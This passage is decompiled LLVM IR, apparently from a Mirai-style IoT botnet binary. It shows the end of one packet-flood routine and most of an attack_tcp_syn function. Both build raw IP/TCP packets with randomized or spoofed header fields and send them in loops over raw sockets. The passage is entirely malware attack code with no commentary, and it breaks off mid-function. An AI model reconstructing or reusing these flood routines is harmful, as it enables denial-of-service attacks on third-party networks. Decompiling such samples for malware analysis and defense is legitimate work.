  %v1_ea50 = call i32 @__GI_htons(i32 %v4_ea48)
  %sext21 = mul i32 %v1_ea50, 65536
  %v1_ea54 = sdiv i32 %sext21, 65536
  %v1_ea60 = trunc i32 %v1_ea54 to i16
  %v3_ea60 = add i32 %v2_e74c, 60
  %v4_ea60 = inttoptr i32 %v3_ea60 to i16*
  store i16 %v1_ea60, i16* %v4_ea60, align 2
  store i32 %v3_ea78, i32* %r0.global-to-local, align 4
  %v1_ea80 = call i32 @__GI_htons(i32 %v3_ea78)
  store i32 %v1_ea80, i32* %r0.global-to-local, align 4
  %sext23 = mul i32 %v1_ea80, 65536
  %v1_ea84 = sdiv i32 %sext23, 65536
  %v1_ea90 = trunc i32 %v1_ea84 to i16
  %v3_ea90 = add i32 %v2_e74c, 62
  %v4_ea90 = inttoptr i32 %v3_ea90 to i16*
  store i16 %v1_ea90, i16* %v4_ea90, align 2
  %v3_ea94 = load i32, i32* %fd_-120, align 4
  %v1_ea98 = add i32 %v3_ea94, 1
  br label %dec_label_pc_eaa0

dec_label_pc_eaa0:                                ; preds = %dec_label_pc_eaa0.preheader, %dec_label_pc_ea2c
  %v3_e70c = phi i32 [ %v1_ea98, %dec_label_pc_ea2c ], [ 0, %dec_label_pc_eaa0.preheader ]
  store i32 %v3_e70c, i32* %fd_-120, align 4
  %sext10 = mul i32 %v3_e70c, 16777216
  %v9_eaac = sdiv i32 %sext10, 16777216
  %v10_eaac = icmp sgt i32 %tmp32, %v9_eaac
  br i1 %v10_eaac, label %dec_label_pc_e70c, label %dec_label_pc_eab0.preheader

dec_label_pc_eab0.preheader:                      ; preds = %dec_label_pc_eaa0
  %v3_ebb8 = icmp eq i32 %v9_e690, -1
  %v3_ebdc = icmp eq i16 %v1_e584, -1
  %v9_ec30 = icmp eq i32 %v9_e5e0, 65535
  %v3_ec5c = icmp eq i16 %v1_e60c, -1
  %tmp79 = bitcast i32* %i_-124 to i8*
  %tmp80 = bitcast i32* %ent1_-128 to i8*
  %tmp81 = bitcast i32* %ent2_-132 to i8*
  %tmp82 = bitcast i32* %stack_var_-130 to i8*
  %v2_ed48 = icmp eq i8 %v1_e64c, 0
  %v2_ee50 = add i32 %targs, 2
  br label %dec_label_pc_eab0

dec_label_pc_eab0:                                ; preds = %dec_label_pc_eeac, %dec_label_pc_eab0.preheader
  br label %dec_label_pc_eeac

dec_label_pc_eabc:                                ; preds = %dec_label_pc_eeac
  %v3_eac0 = mul i32 %v3_eb44, 4
  %v2_eacc = add i32 %v3_eac0, %v3_e538
  %v1_ead0 = inttoptr i32 %v2_eacc to i32*
  %v2_ead0 = load i32, i32* %v1_ead0, align 4
  %v1_eaf0 = add i32 %v2_ead0, 24
  %v1_eafc = add i32 %v2_ead0, 38
  %v1_eb08 = add i32 %v2_ead0, 58
  %v4_eb0c = inttoptr i32 %v1_eb08 to i8*
  %v1_eb14 = add i32 %v2_ead0, 66
  %v4_eb18 = inttoptr i32 %v1_eb14 to i8*
  %v2_eb28 = mul i32 %v3_eb44, 24
  %v2_eb34 = add i32 %v2_eb28, %targs
  %v1_eb38 = add i32 %v2_eb34, 20
  %v2_eb38 = inttoptr i32 %v1_eb38 to i8*
  %v3_eb38 = load i8, i8* %v2_eb38, align 1
  %tmp = icmp ugt i8 %v3_eb38, 31
  br i1 %tmp, label %dec_label_pc_ebb4, label %dec_label_pc_eb44

dec_label_pc_eb44:                                ; preds = %dec_label_pc_eabc
  %v1_eb60 = add i32 %v2_eb34, 16
  %v2_eb60 = inttoptr i32 %v1_eb60 to i32*
  %v3_eb60 = load i32, i32* %v2_eb60, align 4
  store i32 %v3_eb60, i32* %r0.global-to-local, align 4
  %v1_eb68 = call i32 @__GI_ntohl(i32 %v3_eb60)
  store i32 %v1_eb68, i32* %r0.global-to-local, align 4
  store i32 %v1_eb68, i32* @r4, align 4
  %v0_eb70 = call i32 @rand_next()
  store i32 %v0_eb70, i32* %r0.global-to-local, align 4
  %v3_eb78 = load i32, i32* %fd_-120, align 4
  %v2_eb84 = mul i32 %v3_eb78, 24
  %v2_eb90 = add i32 %v2_eb84, %targs
  %v1_eb94 = add i32 %v2_eb90, 20
  %v2_eb94 = inttoptr i32 %v1_eb94 to i8*
  %v3_eb94 = load i8, i8* %v2_eb94, align 1
  %v4_eb94 = zext i8 %v3_eb94 to i32
  %v6_eb98 = lshr i32 %v0_eb70, %v4_eb94
  %v0_eb9c = load i32, i32* @r4, align 4
  %v2_eb9c = add i32 %v0_eb9c, %v6_eb98
  store i32 %v2_eb9c, i32* %r0.global-to-local, align 4
  %v1_eba4 = call i32 @__GI_htonl(i32 %v2_eb9c)
  store i32 %v1_eba4, i32* %r0.global-to-local, align 4
  %v2_ebb0 = add i32 %v2_ead0, 16
  %v3_ebb0 = inttoptr i32 %v2_ebb0 to i32*
  store i32 %v1_eba4, i32* %v3_ebb0, align 4
  br label %dec_label_pc_ebb4

dec_label_pc_ebb4:                                ; preds = %dec_label_pc_eabc, %dec_label_pc_eb44
  br i1 %v3_ebb8, label %dec_label_pc_ebc0, label %dec_label_pc_ebd0

dec_label_pc_ebc0:                                ; preds = %dec_label_pc_ebb4
  %v0_ebc0 = call i32 @rand_next()
  store i32 %v0_ebc0, i32* %r0.global-to-local, align 4
  %v2_ebcc = add i32 %v2_ead0, 12
  %v3_ebcc = inttoptr i32 %v2_ebcc to i32*
  store i32 %v0_ebc0, i32* %v3_ebcc, align 4
  br label %dec_label_pc_ebd0

dec_label_pc_ebd0:                                ; preds = %dec_label_pc_ebb4, %dec_label_pc_ebc0
  br i1 %v3_ebdc, label %dec_label_pc_ebe4, label %dec_label_pc_ec24

dec_label_pc_ebe4:                                ; preds = %dec_label_pc_ebd0
  %v0_ebe4 = call i32 @rand_next()
  store i32 %v0_ebe4, i32* %r0.global-to-local, align 4
  %v1_ebf8 = trunc i32 %v0_ebe4 to i16
  %v3_ebf8 = add i32 %v2_ead0, 4
  %v4_ebf8 = inttoptr i32 %v3_ebf8 to i16*
  store i16 %v1_ebf8, i16* %v4_ebf8, align 2
  %v1_ec04 = add i32 %v0_ebe4, 64536
  %v1_ec10 = xor i32 %v1_ec04, 65535
  %v1_ec20 = trunc i32 %v1_ec10 to i16
  %v3_ec20 = add i32 %v2_ead0, 42
  %v4_ec20 = inttoptr i32 %v3_ec20 to i16*
  store i16 %v1_ec20, i16* %v4_ec20, align 2
  br label %dec_label_pc_ec24

dec_label_pc_ec24:                                ; preds = %dec_label_pc_ebd0, %dec_label_pc_ebe4
  br i1 %v9_ec30, label %dec_label_pc_ec38, label %dec_label_pc_ec50

dec_label_pc_ec38:                                ; preds = %dec_label_pc_ec24
  %v0_ec38 = call i32 @rand_next()
  store i32 %v0_ec38, i32* %r0.global-to-local, align 4
  %v1_ec4c = trunc i32 %v0_ec38 to i16
  %v3_ec4c = inttoptr i32 %v1_eb08 to i16*
  store i16 %v1_ec4c, i16* %v3_ec4c, align 2
  br label %dec_label_pc_ec50

dec_label_pc_ec50:                                ; preds = %dec_label_pc_ec24, %dec_label_pc_ec38
  br i1 %v3_ec5c, label %dec_label_pc_ec64, label %dec_label_pc_ec7c

dec_label_pc_ec64:                                ; preds = %dec_label_pc_ec50
  %v0_ec64 = call i32 @rand_next()
  store i32 %v0_ec64, i32* %r0.global-to-local, align 4
  %v1_ec78 = trunc i32 %v0_ec64 to i16
  %v3_ec78 = add i32 %v2_ead0, 60
  %v4_ec78 = inttoptr i32 %v3_ec78 to i16*
  store i16 %v1_ec78, i16* %v4_ec78, align 2
  br label %dec_label_pc_ec7c

dec_label_pc_ec7c:                                ; preds = %dec_label_pc_ec50, %dec_label_pc_ec64
  br i1 %v2_e9f8, label %dec_label_pc_ec88, label %dec_label_pc_ec9c

dec_label_pc_ec88:                                ; preds = %dec_label_pc_ec7c
  %v0_ec88 = call i32 @rand_next()
  store i32 %v0_ec88, i32* %r0.global-to-local, align 4
  %v2_ec94 = add i32 %v2_ead0, 54
  %v3_ec94 = inttoptr i32 %v2_ec94 to i32*
  store i32 %v0_ec88, i32* %v3_ec94, align 4
  br label %dec_label_pc_ecac

dec_label_pc_ec9c:                                ; preds = %dec_label_pc_ec7c
  %v1_eca0 = add i32 %v2_ead0, 16
  %v2_eca0 = inttoptr i32 %v1_eca0 to i32*
  %v3_eca0 = load i32, i32* %v2_eca0, align 4
  %v2_eca8 = add i32 %v2_ead0, 54
  %v3_eca8 = inttoptr i32 %v2_eca8 to i32*
  store i32 %v3_eca0, i32* %v3_eca8, align 4
  br label %dec_label_pc_ecac

dec_label_pc_ecac:                                ; preds = %dec_label_pc_ec88, %dec_label_pc_ec9c
  %v0_ecac = call i32 @rand_next()
  store i32 %v0_ecac, i32* %r0.global-to-local, align 4
  store i32 %v0_ecac, i32* %i_-124, align 4
  %v0_ecb8 = call i32 @rand_next()
  store i32 %v0_ecb8, i32* %r0.global-to-local, align 4
  store i32 %v0_ecb8, i32* %ent1_-128, align 4
  %v0_ecc4 = call i32 @rand_next()
  store i32 %v0_ecc4, i32* %ent2_-132, align 4
  %v1_ecd8 = inttoptr i32 %v1_eaf0 to i8*
  store i32 %v1_eaf0, i32* %r0.global-to-local, align 4
  call void @util_memcpy(i8* %v1_ecd8, i8* %tmp79, i32 4)
  %v1_ecec = add i32 %v2_ead0, 30
  %v1_ecf4 = inttoptr i32 %v1_ecec to i8*
  store i32 %v1_ecec, i32* %r0.global-to-local, align 4
  call void @util_memcpy(i8* %v1_ecf4, i8* %tmp80, i32 4)
  %v1_ed08 = add i32 %v2_ead0, 28
  %v1_ed10 = inttoptr i32 %v1_ed08 to i8*
  store i32 %v1_ed08, i32* %r0.global-to-local, align 4
  call void @util_memcpy(i8* %v1_ed10, i8* %tmp81, i32 2)
  %v1_ed28 = add i32 %v2_ead0, 34
  %v1_ed34 = inttoptr i32 %v1_ed28 to i8*
  store i32 %v1_ed28, i32* %r0.global-to-local, align 4
  call void @util_memcpy(i8* %v1_ed34, i8* %tmp82, i32 2)
  store i32 ptrtoint (i32* @0 to i32), i32* %r0.global-to-local, align 4
  br i1 %v2_ed48, label %dec_label_pc_ed5c, label %dec_label_pc_ed50

dec_label_pc_ed50:                                ; preds = %dec_label_pc_ecac
  store i32 %v1_eb14, i32* %r0.global-to-local, align 4
  call void @rand_str(i8* %v4_eb18, i32 %v9_e624)
  store i32 ptrtoint (i32* @0 to i32), i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ed5c

dec_label_pc_ed5c:                                ; preds = %dec_label_pc_ecac, %dec_label_pc_ed50
  %v3_ed64 = add i32 %v2_ead0, 10
  %v4_ed64 = inttoptr i32 %v3_ed64 to i16*
  store i16 0, i16* %v4_ed64, align 2
  %v1_ed6c = inttoptr i32 %v2_ead0 to i16*
  store i32 %v2_ead0, i32* %r0.global-to-local, align 4
  %v5_ed74 = call i16 @checksum_generic(i16* %v1_ed6c, i32 20)
  store i16 %v5_ed74, i16* %v4_ed64, align 2
  %v3_ed90 = add i32 %v2_ead0, 48
  %v4_ed90 = inttoptr i32 %v3_ed90 to i16*
  store i16 0, i16* %v4_ed90, align 2
  %v1_ed98 = inttoptr i32 %v1_eafc to i16*
  store i32 %v1_eafc, i32* %r0.global-to-local, align 4
  %v5_eda0 = call i16 @checksum_generic(i16* %v1_ed98, i32 20)
  %v7_eda0 = sext i16 %v5_eda0 to i32
  store i32 %v7_eda0, i32* %r0.global-to-local, align 4
  store i16 %v5_eda0, i16* %v4_ed90, align 2
  %v3_edbc = add i32 %v2_ead0, 64
  %v4_edbc = inttoptr i32 %v3_edbc to i16*
  store i16 0, i16* %v4_edbc, align 2
  %v1_edc4 = add i32 %v2_ead0, 62
  %v2_edc4 = inttoptr i32 %v1_edc4 to i16*
  %v3_edc4 = load i16, i16* %v2_edc4, align 2
  store i32 %v1_eafc, i32* %r0.global-to-local, align 4
  %v8_edd8 = call i16 @checksum_tcpudp(i32 %v1_eafc, i8* %v4_eb0c, i16 %v3_edc4, i32 %fold22)
  %v10_edd8 = sext i16 %v8_edd8 to i32
  store i32 %v10_edd8, i32* %r0.global-to-local, align 4
  store i16 %v8_edd8, i16* %v4_edbc, align 2
  %v3_edec = load i32, i32* %fd_-120, align 4
  %v2_edf8 = mul i32 %v3_edec, 24
  %v2_ee04 = add i32 %v2_edf8, %targs
  %v3_ee0c = inttoptr i32 %v2_ee04 to i16*
  store i16 2, i16* %v3_ee0c, align 2
  %v3_ee10 = load i32, i32* %fd_-120, align 4
  %v2_ee1c = mul i32 %v3_ee10, 24
  %v2_ee28 = add i32 %v2_ee1c, %targs
  %v1_ee30 = add i32 %v2_ead0, 16
  %v2_ee30 = inttoptr i32 %v1_ee30 to i32*
  %v3_ee30 = load i32, i32* %v2_ee30, align 4
  %v2_ee34 = add i32 %v2_ee28, 4
  %v3_ee34 = inttoptr i32 %v2_ee34 to i32*
  store i32 %v3_ee30, i32* %v3_ee34, align 4
  %v3_ee38 = load i32, i32* %fd_-120, align 4
  %v2_ee44 = mul i32 %v3_ee38, 24
  %v3_ee58 = add i32 %v2_ee50, %v2_ee44
  %v4_ee58 = inttoptr i32 %v3_ee58 to i16*
  store i16 0, i16* %v4_ee58, align 2
  store i32 %fold, i32* %ip.global-to-local, align 4
  %v3_ee64 = load i32, i32* %fd_-120, align 4
  %v2_ee70 = mul i32 %v3_ee64, 24
  %v2_ee7c = add i32 %v2_ee70, %targs
  store i32 %v3_e6a8, i32* %r0.global-to-local, align 4
  %v6_ee9c = call i32 @__libc_sendto(i32 %v3_e6a8, i32 %v2_ead0, i32 %fold, i32 16384, i32 %v2_ee7c, i32 16)
  store i32 %v6_ee9c, i32* %r0.global-to-local, align 4
  %v3_eea0 = load i32, i32* %fd_-120, align 4
  %v1_eea4 = add i32 %v3_eea0, 1
  br label %dec_label_pc_eeac

dec_label_pc_eeac:                                ; preds = %dec_label_pc_eab0, %dec_label_pc_ed5c
  %v3_eb44 = phi i32 [ 0, %dec_label_pc_eab0 ], [ %v1_eea4, %dec_label_pc_ed5c ]
  store i32 %v3_eb44, i32* %fd_-120, align 4
  %sext11 = mul i32 %v3_eb44, 16777216
  %v9_eeb8 = sdiv i32 %sext11, 16777216
  %v10_eeb8 = icmp sgt i32 %tmp32, %v9_eeb8
  br i1 %v10_eeb8, label %dec_label_pc_eabc, label %dec_label_pc_eab0

dec_label_pc_eec0:                                ; preds = %entry, %dec_label_pc_e6f4
  ret void

; uselistorder directives
  uselistorder i32 %v3_eb44, { 0, 3, 1, 2 }
  uselistorder i32 %v1_eafc, { 1, 0, 3, 2 }
  uselistorder i32 %v1_eaf0, { 1, 0 }
  uselistorder i32 %v2_ead0, { 12, 13, 3, 4, 5, 15, 14, 16, 6, 7, 8, 9, 11, 2, 1, 0, 17, 18, 10, 19, 20, 21, 22 }
  uselistorder i32 %v3_e70c, { 0, 2, 1 }
  uselistorder i32 %v2_e74c, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 %v3_ea78, { 1, 0 }
  uselistorder i32 %fold22, { 1, 0 }
  uselistorder i32 %v3_e98c, { 1, 0 }
  uselistorder i32 %v3_e964, { 1, 0 }
  uselistorder i32 %v3_e7ec, { 1, 0 }
  uselistorder i32 %fold, { 1, 2, 0 }
  uselistorder i32 %v3_e6a8, { 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder i32 %v9_e5e0, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %fd_-120, { 1, 2, 3, 4, 5, 6, 7, 0, 8, 9, 10, 12, 11 }
  uselistorder i32* %i_-124, { 1, 0 }
  uselistorder i32* %ent1_-128, { 1, 0 }
  uselistorder i32* %ent2_-132, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 7, 9, 8, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 26, 25, 28, 27, 29, 30, 31, 33, 32, 35, 34, 36, 37, 38, 39, 40, 42, 41, 44, 43, 45, 47, 46, 49, 48, 51, 50, 53, 52, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 0 }
  uselistorder i32 54, { 3, 2, 0, 1 }
  uselistorder i32 39, { 0, 2, 1 }
  uselistorder i32 66, { 1, 0 }
  uselistorder i32 %targs, { 0, 2, 3, 4, 5, 1, 6 }
  uselistorder label %dec_label_pc_eec0, { 1, 0 }
  uselistorder label %dec_label_pc_eeac, { 1, 0 }
  uselistorder label %dec_label_pc_ed5c, { 1, 0 }
  uselistorder label %dec_label_pc_ecac, { 1, 0 }
  uselistorder label %dec_label_pc_ec7c, { 1, 0 }
  uselistorder label %dec_label_pc_ec50, { 1, 0 }
  uselistorder label %dec_label_pc_ec24, { 1, 0 }
  uselistorder label %dec_label_pc_ebd0, { 1, 0 }
  uselistorder label %dec_label_pc_ebb4, { 1, 0 }
  uselistorder label %dec_label_pc_eaa0, { 1, 0 }
  uselistorder label %dec_label_pc_ea2c, { 1, 0 }
  uselistorder label %dec_label_pc_e9d8, { 1, 0 }
  uselistorder label %dec_label_pc_e854, { 1, 0 }
}

define void @attack_tcp_syn(i8 %targs_len, i32 %targs, i8 %opts_len, i32 %opts) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp30 = sext i8 %targs_len to i32
  %fd_-92 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_eed4 = load i32, i32* @r4, align 4
  store i32 61148, i32* %stack_var_-4, align 4
  %v2_eed8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_eed8, i32* @fp, align 4
  %v3_ef04 = call i32 @calloc(i32 %tmp30, i32 4)
  %v9_ef24 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 2, i32 0)
  %sext = mul i32 %v9_ef24, 16777216
  %v1_ef28 = sdiv i32 %sext, 16777216
  %v1_ef2c = trunc i32 %v1_ef28 to i8
  %v9_ef48 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 3, i32 65535)
  %sext2 = mul i32 %v9_ef48, 65536
  %v1_ef4c = sdiv i32 %sext2, 65536
  %v1_ef50 = trunc i32 %v1_ef4c to i16
  %v9_ef68 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 4, i32 64)
  %v1_ef70 = trunc i32 %v9_ef68 to i8
  %v9_ef88 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 5, i32 1)
  %sext4 = mul i32 %v9_ef88, 16777216
  %v1_ef8c = sdiv i32 %sext4, 16777216
  %v1_ef90 = trunc i32 %v1_ef8c to i8
  %v9_efac = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 6, i32 65535)
  %v9_efd0 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 7, i32 65535)
  %sext5 = mul i32 %v9_efd0, 65536
  %v1_efd4 = sdiv i32 %sext5, 65536
  %v1_efd8 = trunc i32 %v1_efd4 to i16
  %v9_eff4 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 17, i32 65535)
  %v9_f014 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 18, i32 0)
  %v9_f034 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 11, i32 0)
  %sext6 = mul i32 %v9_f034, 16777216
  %v1_f038 = sdiv i32 %sext6, 16777216
  %v1_f03c = trunc i32 %v1_f038 to i8
  %v9_f054 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 12, i32 0)
  %v9_f074 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 13, i32 0)
  %v9_f094 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 14, i32 0)
  %v9_f0b4 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 15, i32 1)
  %v9_f0d4 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 16, i32 0)
  %v2_f0e4 = load i32, i32* @LOCAL_ADDR, align 4
  %v9_f0fc = call i32 @attack_get_opt_ip(i8 %opts_len, i32 %opts, i8 25, i32 %v2_f0e4)
  %v3_f114 = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_f124 = icmp eq i32 %v3_f114, -1
  br i1 %v7_f124, label %dec_label_pc_f8e8, label %dec_label_pc_f12c

dec_label_pc_f12c:                                ; preds = %entry
  store i32 1, i32* %fd_-92, align 4
  %v2_f134 = ptrtoint i32* %fd_-92 to i32
  store i32 0, i32* @r1, align 4
  %v5_f150 = call i32 @__GI_setsockopt(i32 %v3_f114, i32 0, i32 3, i32 %v2_f134, i32 4)
  %v3_f158 = icmp eq i32 %v5_f150, -1
  br i1 %v3_f158, label %dec_label_pc_f160, label %dec_label_pc_f60c.preheader

dec_label_pc_f60c.preheader:                      ; preds = %dec_label_pc_f12c
  %v4_f240 = urem i32 %v1_ef4c, 65536
  %v2_f26c = icmp eq i8 %v1_ef90, 0
  %v4_f2e8 = urem i32 %v1_efd4, 65536
  %v3_f30c = urem i32 %v9_eff4, 65536
  %v1_f354 = urem i32 %v1_f038, 2
  %v1_f38c = urem i32 %v9_f054, 2
  %tmp = sub nsw i32 0, %v1_f38c
  %v3_f3a8 = and i32 %tmp, 16
  %v1_f3c4 = urem i32 %v9_f074, 2
  %tmp79 = sub nsw i32 0, %v1_f3c4
  %v3_f3e0 = and i32 %tmp79, 8
  %v1_f3fc = urem i32 %v9_f094, 2
  %tmp80 = sub nsw i32 0, %v1_f3fc
  %v1_f434 = urem i32 %v9_f0b4, 2
  %tmp81 = sub nsw i32 0, %v1_f434
  %v2_f450 = and i32 %tmp81, 2
  %v1_f46c = urem i32 %v9_f0d4, 2
  %tmp82 = sub nsw i32 0, %v1_f354
  %v3_f370 = and i32 %tmp82, 32
  br label %dec_label_pc_f60c

dec_label_pc_f160:                                ; preds = %dec_label_pc_f12c
  %v1_f164 = call i32 @__GI___libc_close(i32 %v3_f114)
  br label %dec_label_pc_f8e8

dec_label_pc_f178:                                ; preds = %dec_label_pc_f60c
  %v3_f17c = mul i32 %v3_f178, 4
  %v2_f188 = add i32 %v3_f17c, %v3_ef04
  store i32 %v2_f188, i32* @r4, align 4
  %v2_f194 = call i32 @calloc(i32 128, i32 1)
  %v1_f19c = load i32, i32* @r4, align 4
  %v2_f19c = inttoptr i32 %v1_f19c to i32*
  store i32 %v2_f194, i32* %v2_f19c, align 4
  %v3_f1a0 = load i32, i32* %fd_-92, align 4
  %v3_f1a4 = mul i32 %v3_f1a0, 4
  %v2_f1b0 = add i32 %v3_f1a4, %v3_ef04
  %v1_f1b4 = inttoptr i32 %v2_f1b0 to i32*
  %v2_f1b4 = load i32, i32* %v1_f1b4, align 4
  %v5_f1b8 = inttoptr i32 %v2_f1b4 to i8*
  %v1_f1c0 = add i32 %v2_f1b4, 20
  %v1_f1cc = add i32 %v2_f1b4, 40
  %v4_f1d0 = inttoptr i32 %v1_f1cc to i8*
  store i8 69, i8* %v5_f1b8, align 1
  %v3_f224 = add i32 %v2_f1b4, 1
  %v4_f224 = inttoptr i32 %v3_f224 to i8*
  store i8 %v1_ef2c, i8* %v4_f224, align 1
  %v1_f22c = call i32 @__GI_htons(i32 60)
  %sext13 = mul i32 %v1_f22c, 65536
  %v1_f230 = sdiv i32 %sext13, 65536
  %v1_f23c = trunc i32 %v1_f230 to i16
  %v3_f23c = add i32 %v2_f1b4, 2
  %v4_f23c = inttoptr i32 %v3_f23c to i16*
  store i16 %v1_f23c, i16* %v4_f23c, align 2
  %v1_f248 = call i32 @__GI_htons(i32 %v4_f240)
  %v1_f258 = trunc i32 %v1_f248 to i16
  %v3_f258 = add i32 %v2_f1b4, 4
  %v4_f258 = inttoptr i32 %v3_f258 to i16*
  store i16 %v1_f258, i16* %v4_f258, align 2
  %v3_f264 = add i32 %v2_f1b4, 8
  %v4_f264 = inttoptr i32 %v3_f264 to i8*
  store i8 %v1_ef70, i8* %v4_f264, align 1
  br i1 %v2_f26c, label %dec_label_pc_f28c, label %dec_label_pc_f274

dec_label_pc_f274:                                ; preds = %dec_label_pc_f178
  %v1_f278 = call i32 @__GI_htons(i32 16384)
  %sext15 = mul i32 %v1_f278, 65536
  %v1_f27c = sdiv i32 %sext15, 65536
  %v1_f288 = trunc i32 %v1_f27c to i16
  %v3_f288 = add i32 %v2_f1b4, 6
  %v4_f288 = inttoptr i32 %v3_f288 to i16*
  store i16 %v1_f288, i16* %v4_f288, align 2
  br label %dec_label_pc_f28c

dec_label_pc_f28c:                                ; preds = %dec_label_pc_f178, %dec_label_pc_f274
  %v3_f294 = add i32 %v2_f1b4, 9
  %v4_f294 = inttoptr i32 %v3_f294 to i8*
  store i8 6, i8* %v4_f294, align 1
  %v2_f2a0 = add i32 %v2_f1b4, 12
  %v3_f2a0 = inttoptr i32 %v2_f2a0 to i32*
  store i32 %v9_f0fc, i32* %v3_f2a0, align 4
  %v3_f2a4 = load i32, i32* %fd_-92, align 4
  %v2_f2b0 = mul i32 %v3_f2a4, 24
  %v2_f2bc = add i32 %v2_f2b0, %targs
  %v1_f2c0 = add i32 %v2_f2bc, 16
  %v2_f2c0 = inttoptr i32 %v1_f2c0 to i32*
  %v3_f2c0 = load i32, i32* %v2_f2c0, align 4
  %v2_f2c8 = add i32 %v2_f1b4, 16
  %v3_f2c8 = inttoptr i32 %v2_f2c8 to i32*
  store i32 %v3_f2c0, i32* %v3_f2c8, align 4
  %v1_f2d4 = call i32 @__GI_htons(i32 %v9_efac)
  %sext16 = mul i32 %v1_f2d4, 65536
  %v1_f2d8 = sdiv i32 %sext16, 65536
  %v1_f2e4 = trunc i32 %v1_f2d8 to i16
  %v3_f2e4 = inttoptr i32 %v1_f1c0 to i16*
  store i16 %v1_f2e4, i16* %v3_f2e4, align 2
  %v1_f2f0 = call i32 @__GI_htons(i32 %v4_f2e8)
  %sext17 = mul i32 %v1_f2f0, 65536
  %v1_f2f4 = sdiv i32 %sext17, 65536
  %v1_f300 = trunc i32 %v1_f2f4 to i16
  %v3_f300 = add i32 %v2_f1b4, 22
  %v4_f300 = inttoptr i32 %v3_f300 to i16*
  store i16 %v1_f300, i16* %v4_f300, align 2
  %v1_f314 = call i32 @__GI_htons(i32 %v3_f30c)
  %v2_f324 = add i32 %v2_f1b4, 24
  %v3_f324 = inttoptr i32 %v2_f324 to i32*
  store i32 %v1_f314, i32* %v3_f324, align 4
  %v1_f32c = add i32 %v2_f1b4, 32
  %v2_f32c = inttoptr i32 %v1_f32c to i8*
  %v3_f32c = load i8, i8* %v2_f32c, align 1
  %v1_f338 = urem i8 %v3_f32c, 16
  %v1_f33c = or i8 %v1_f338, -96
  store i8 %v1_f33c, i8* %v2_f32c, align 1
  %v1_f35c = add i32 %v2_f1b4, 33
  %v2_f35c = inttoptr i32 %v1_f35c to i8*
  %v3_f35c = load i8, i8* %v2_f35c, align 1
  %v4_f35c = zext i8 %v3_f35c to i32
  %v1_f36c = and i32 %v4_f35c, 192
  %v2_f374 = or i32 %v1_f36c, %v3_f370
  %v2_f3ac = or i32 %v2_f374, %v3_f3a8
  %v2_f3e4 = or i32 %v2_f3ac, %v3_f3e0
  %v3_f418.masked.masked = and i32 %tmp80, 4
  %v1_f44c.masked = or i32 %v2_f3e4, %v3_f418.masked.masked
  %v1_f484 = or i32 %v1_f44c.masked, %v2_f450
  %v2_f488 = or i32 %v1_f484, %v1_f46c
  %v1_f494 = trunc i32 %v2_f488 to i8
  store i8 %v1_f494, i8* %v2_f35c, align 1
  store i8 2, i8* %v4_f1d0, align 1
  %v1_f4a8 = add i32 %v2_f1b4, 41
  %v4_f4ac = inttoptr i32 %v1_f4a8 to i8*
  store i8 4, i8* %v4_f4ac, align 1
  %v1_f4c0 = add i32 %v2_f1b4, 42
  store i32 %v1_f4c0, i32* %r4.global-to-local, align 4
  %v0_f4cc = call i32 @rand_next()
  %v1_f4dc = urem i32 %v0_f4cc, 16
  %v1_f4e0 = or i32 %v1_f4dc, 1392
  %v1_f4e4 = add nuw nsw i32 %v1_f4e0, 8
  %v1_f4f4 = call i32 @__GI_htons(i32 %v1_f4e4)
  %v1_f4fc = trunc i32 %v1_f4f4 to i16
  %v2_f4fc = load i32, i32* %r4.global-to-local, align 4
  %v3_f4fc = inttoptr i32 %v2_f4fc to i16*
  store i16 %v1_f4fc, i16* %v3_f4fc, align 2
  %v1_f504 = add i32 %v2_f1b4, 44
  %v4_f508 = inttoptr i32 %v1_f504 to i8*
  store i8 4, i8* %v4_f508, align 1
  %v1_f51c = add i32 %v2_f1b4, 45
  %v4_f520 = inttoptr i32 %v1_f51c to i8*
  store i8 2, i8* %v4_f520, align 1
  %v1_f534 = add i32 %v2_f1b4, 46
  %v4_f538 = inttoptr i32 %v1_f534 to i8*
  store i8 8, i8* %v4_f538, align 1
  %v1_f54c = add i32 %v2_f1b4, 47
  %v4_f550 = inttoptr i32 %v1_f54c to i8*
  store i8 10, i8* %v4_f550, align 1
  %v1_f564 = add i32 %v2_f1b4, 48
  store i32 %v1_f564, i32* @r4, align 4
  %v0_f570 = call i32 @rand_next()
  %v1_f578 = load i32, i32* @r4, align 4
  %v2_f578 = inttoptr i32 %v1_f578 to i32*
  store i32 %v0_f570, i32* %v2_f578, align 4
  %v1_f580 = add i32 %v2_f1b4, 52
  %v2_f590 = inttoptr i32 %v1_f580 to i32*
  store i32 0, i32* %v2_f590, align 4
  %v1_f598 = add i32 %v2_f1b4, 56
  %v4_f59c = inttoptr i32 %v1_f598 to i8*
  store i8 1, i8* %v4_f59c, align 1
  %v1_f5b0 = add i32 %v2_f1b4, 57
  %v4_f5b4 = inttoptr i32 %v1_f5b0 to i8*
